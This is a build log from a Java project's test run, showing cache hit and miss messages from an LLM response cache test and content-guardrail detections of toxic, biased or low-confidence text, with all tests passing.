2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1180a0e3
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c97a9867
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 8471c909
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 8ae05f1c
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 29eab4bf
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 98850a3d
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 9f9eb634
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 6d19c8e8
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 2c9c6b23
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: f886fcb7
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: e2f847de
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 038e76cd
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 9a7d8f7a
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 9f905d32
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 3250cf44
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: a3fab947
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 75c0310d
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 4c0a4051
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1e6153bc
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 13623da4
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 72f20ed2
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 7ba05900
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c84aedf2
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: e2dddcb1
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 11208102
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 86acc4d5
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 8e9b71bd
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: db208ad8
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 4b5aca39
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 93fc566b
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: c819254a
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1e4b0999
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: fd170e6a
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 06d703c7
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: dec84d6d
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 0e5dc4f7
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 9bc805bd
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 1ea80684
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 73b072cb
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 5ca44d14
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: f07f2587
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 2b434467
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: df7e1bb4
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: adc56c6c
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 162ce92c
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 3c89ed35
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 82410a19
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Evicted cache entry: 9a30fdba
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a1680e61
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 70af4b62
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5314f296
2026-01-17T23:26:50.284Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 57a60a43
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7e6331c1
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 933f103c
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 71ad76fb
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 91f65452
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: dd40d65c
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f2a8a4f0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c11852f0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c6a9894a
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 78824b94
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e07b55de
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a1f63514
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ae3eac13
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 47938c03
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5f22eee5
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 454e9d4c
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b7a1dcb1
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 14f1f0af
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d1534ce7
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f320e390
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9027260f
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 63ba75d4
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4781736d
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5f6656b4
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 0bb97836
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 09838321
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5cf99525
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c0bf2ff9
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d190f855
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 42852f3b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4996d703
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 0f0a9f54
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e4f2928f
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4b308b64
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 25cb3250
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b55a46d6
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 22b4d312
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 32d52415
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1694d6ad
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 62b28711
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e43fee0f
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e04552df
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 72954925
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: dfe0efdb
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 379a025b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c0604f98
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d15c234f
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 686899de
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 1b6db8a8
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d54e5bdb
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 740f2f0b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7a794151
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b73dfb1b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: fec2778f
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f8492ff0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9f6f1833
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 3736b45e
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c7db3768
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 202fbbfa
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 178e6904
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2c119a06
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 5645bbf0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ee806826
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 963efff0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e2767170
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 2b2b67d5
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d921fc19
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: bfd181fc
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: f5d44f9b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 21b37b8b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 82a4c443
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4aa7b87a
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e233f755
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c8948abd
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b0fb7954
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: bad458d1
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 712f1f00
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a7ac46b3
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 41b913a6
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d9796522
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: c33362a0
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 187d5266
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d6090b71
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: cef97f81
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 32fb7f30
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b7809224
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 9071ddca
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 4f39e456
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: d35ba47c
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a396fbbe
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 997f64d4
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 7df8cc58
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 18a3ea83
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 45f32899
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: ad8a1975
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: a33adf60
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache MISS for prompt hash: 42b69f29
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache MISS for prompt hash: 90e0b256
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache MISS for prompt hash: 82410a19
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: c44d7a3b
2026-01-17T23:26:50.285Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: a33adf60
2026-01-17T23:26:50.286Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache MISS for prompt hash: 12b49acb
2026-01-17T23:26:50.286Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: e0ac0bdf
2026-01-17T23:26:52.291Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: e0ac0bdf
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 314f3bac
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 14916850
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 34c14823
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 314f3bac
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 14916850
2026-01-17T23:26:52.297Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 34c14823
2026-01-17T23:26:52.301Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 12b49acb
2026-01-17T23:26:52.301Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:52.303Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 12b49acb
2026-01-17T23:26:52.303Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 12b49acb
2026-01-17T23:26:52.303Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 12b49acb
2026-01-17T23:26:52.304Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache MISS for prompt hash: b997c468
2026-01-17T23:26:52.304Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b997c468
2026-01-17T23:26:52.304Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: b997c468
2026-01-17T23:26:52.305Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: b997c468
2026-01-17T23:26:52.305Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: b997c468
2026-01-17T23:26:52.305Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: b997c468
2026-01-17T23:26:52.306Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cached response for prompt hash: 85757d9e
2026-01-17T23:26:52.307Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 85757d9e
2026-01-17T23:26:52.307Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.LLMCacheService       : Cache HIT for prompt hash: 85757d9e
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 2.038 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.LLMCacheServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.qa.ContentGuardrailsTest
2026-01-17T23:26:52.309Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Toxic content detected: pattern=\b(hate|stupid|idiot|dumb|moron)\b
2026-01-17T23:26:52.309Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [TOXIC_CONTENT]
2026-01-17T23:26:52.310Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [LOW_CONFIDENCE]
2026-01-17T23:26:52.311Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Potential bias detected: pattern=\b(always|never)\s+(the\s+)?(best|worst|right|wrong)
2026-01-17T23:26:52.311Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [POTENTIAL_BIAS]
2026-01-17T23:26:52.311Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Hallucination indicators detected: count=3
2026-01-17T23:26:52.311Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [LOW_CONFIDENCE_HALLUCINATION]
2026-01-17T23:26:52.313Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Potential bias detected: pattern=\b(always|never)\s+(the\s+)?(best|worst|right|wrong)
2026-01-17T23:26:52.313Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [POTENTIAL_BIAS]
2026-01-17T23:26:52.314Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Hallucination indicators detected: count=2
2026-01-17T23:26:52.314Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [LOW_CONFIDENCE_HALLUCINATION]
2026-01-17T23:26:52.314Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Toxic content detected: pattern=\b(hate|stupid|idiot|dumb|moron)\b
2026-01-17T23:26:52.314Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.qa.ContentGuardrails     : Guardrail violations detected: [TOXIC_CONTENT]
[INFO] Tests run: 10, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.007 s -- in com.github.farzadsedaghatbin.shipflow.service.qa.ContentGuardrailsTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CacheCleanupTests
2026-01-17T23:26:52.316Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
